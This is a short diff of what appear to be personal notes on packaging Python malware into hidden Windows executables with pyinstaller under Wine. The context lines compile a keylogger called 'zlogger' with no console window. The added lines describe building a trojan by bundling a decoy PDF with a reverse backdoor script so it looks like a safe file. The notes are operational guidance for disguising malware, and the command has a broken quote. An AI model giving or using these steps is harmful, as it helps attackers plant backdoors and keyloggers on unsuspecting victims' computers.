@@ -30,3 +30,9 @@ so now on linux
 we just need to package zlogger file, the packager will automatically know that the file depends on the keylogger file
 
 wine /root/.wine/drive_c/Python27/scripts/pyinstaller.exe zlogger.py --onefile --noconsole
+
+
+While creating a trojan use this command to pack a safe file with the backdoor 
+
+!wine /root/.wine/drive_c/Python277/Scripts/pyinstaller.exe --add-data "/root/Downloads/sample.pdf,. --onefile --noconsole reverse_backdoor.py
+
